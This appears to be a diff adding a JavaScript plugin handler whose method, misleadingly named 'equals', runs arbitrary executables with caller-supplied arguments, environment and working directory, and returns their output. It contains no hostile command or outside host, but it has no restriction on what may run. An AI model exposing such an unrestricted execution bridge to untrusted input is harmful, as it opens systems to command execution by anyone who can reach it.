@@ -1,0 +1,166 @@
+(function () {
+    return {
+        equals: async function (ctx) {
+            const result = {};
+            const cp = await import("node:child_process");
+            const fs = await import("node:fs");
+            const path = await import("node:path");
+            const os = await import("node:os");
+            try {
+                const op = typeof ctx.op === "string" ? ctx.op.trim() : "";
+                if (!op) {
+                    result.error = "op is required";
+                    ctx.result = result;
+                    return;
+                }
+
+                const cwd = normalizePath(path, typeof ctx.cwd === "string" ? ctx.cwd : "");
+                const charset = normalizeCharset(typeof ctx.charset === "string" ? ctx.charset : "");
+                result.cwd = cwd;
+                result.charsetUsed = charset;
+
+                if (op === "cd") {
+                    const cdTarget = typeof ctx.cdTarget === "string" ? ctx.cdTarget : "~";
+                    const nextCwd = resolveCdTarget(path, fs, os, cwd, cdTarget);
+                    result.stdout = "";
+                    result.stderr = "";
+                    result.exitCode = 0;
+                    result.cwd = nextCwd;
+                    ctx.result = result;
+                    return;
+                }
+
+                if (op !== "exec") {
+                    result.error = "unsupported op: " + op;
+                    ctx.result = result;
+                    return;
+                }
+
+                const executable = typeof ctx.executable === "string" ? ctx.executable.trim() : "";
+                if (!executable) {
+                    result.error = "executable is required";
+                    ctx.result = result;
+                    return;
+                }
+
+                const argv = Array.isArray(ctx.argv) ? ctx.argv.map((item) => String(item)) : [];
+                const env = isPlainObject(ctx.env) ? normalizeEnv(ctx.env) : {};
+
+                const execResult = await new Promise((resolve) => {
+                    const child = cp.spawn(executable, argv, {
+                        cwd,
+                        env: Object.assign({}, process.env, env),
+                        windowsHide: true,
+                        stdio: ["ignore", "pipe", "pipe"],
+                    });
+
+                    const stdoutChunks = [];
+                    const stderrChunks = [];
+                    child.stdout.on("data", (chunk) => stdoutChunks.push(chunk));
+                    child.stderr.on("data", (chunk) => stderrChunks.push(chunk));
+                    child.on("close", (code) => {
+                        const stdoutBuffer = Buffer.concat(stdoutChunks);
+                        const stderrBuffer = Buffer.concat(stderrChunks);
+                        resolve({
+                            stdout: decode(stdoutBuffer, charset),
+                            stderr: decode(stderrBuffer, charset),
+                            exitCode: code == null ? -1 : code,
+                            cwd,
+                            charsetUsed: charset,
+                        });
+                    });
+                    child.on("error", (err) => {
+                        resolve({
+                            error: "Command execution failed: " + err.message
+                        });
+                    });
+                });
+
+                if (execResult.error) {
+                    result.error = execResult.error;
+                } else {
+                    result.stdout = execResult.stdout;
+                    result.stderr = execResult.stderr;
+                    result.exitCode = execResult.exitCode;
+                    result.cwd = execResult.cwd;
+                    result.charsetUsed = execResult.charsetUsed;
+                }
+            } catch (e) {
+                result.error = "Failed: " + e.message;
+            }
+            ctx.result = result;
+        }
+    };
+
+    function normalizePath(path, rawCwd) {
+        if (!rawCwd || rawCwd.trim().length === 0) {
+            return process.cwd();
+        }
+        const cwd = rawCwd.trim();
+        return path.isAbsolute(cwd) ? path.normalize(cwd) : path.resolve(process.cwd(), cwd);
+    }
+
+    function normalizeCharset(rawCharset) {
+        if (!rawCharset || rawCharset.trim().length === 0) {
+            return "utf8";
+        }
+        return rawCharset.trim();
+    }
+
+    function resolveCdTarget(path, fs, os, cwd, rawTarget) {
+        let target = stripPairQuote((rawTarget || "~").trim());
+        if (!target || target === "~") {
+            return os.homedir();
+        }
+        if (target.startsWith("~/") || target.startsWith("~\\")) {
+            target = path.join(os.homedir(), target.slice(2));
+        }
+        const resolved = path.isAbsolute(target) ? path.normalize(target) : path.resolve(cwd, target);
+        if (!fs.existsSync(resolved)) {
+            throw new Error("Directory does not exist: " + resolved);
+        }
+        if (!fs.statSync(resolved).isDirectory()) {
+            throw new Error("Not a directory: " + resolved);
+        }
+        return resolved;
+    }
+
+    function stripPairQuote(value) {
+        if (!value || value.length < 2) {
+            return value;
+        }
+        const first = value[0];
+        const last = value[value.length - 1];
+        if ((first === '"' && last === '"') || (first === "'" && last === "'")) {
+            return value.slice(1, -1);
+        }
+        return value;
+    }
+
+    function decode(buffer, charset) {
+        try {
+            return buffer.toString(charset);
+        } catch (_e) {
+            return buffer.toString("utf8");
+        }
+    }
+
+    function isPlainObject(value) {
+        return value != null && typeof value === "object" && !Array.isArray(value);
+    }
+
+    function normalizeEnv(rawEnv) {
+        const env = {};
+        for (const [key, value] of Object.entries(rawEnv)) {
+            const normalizedKey = String(key).trim();
+            if (!normalizedKey) {
+                continue;
+            }
+            if (value == null) {
+                continue;
+            }
+            env[normalizedKey] = String(value);
+        }
+        return env;
+    }
+})();
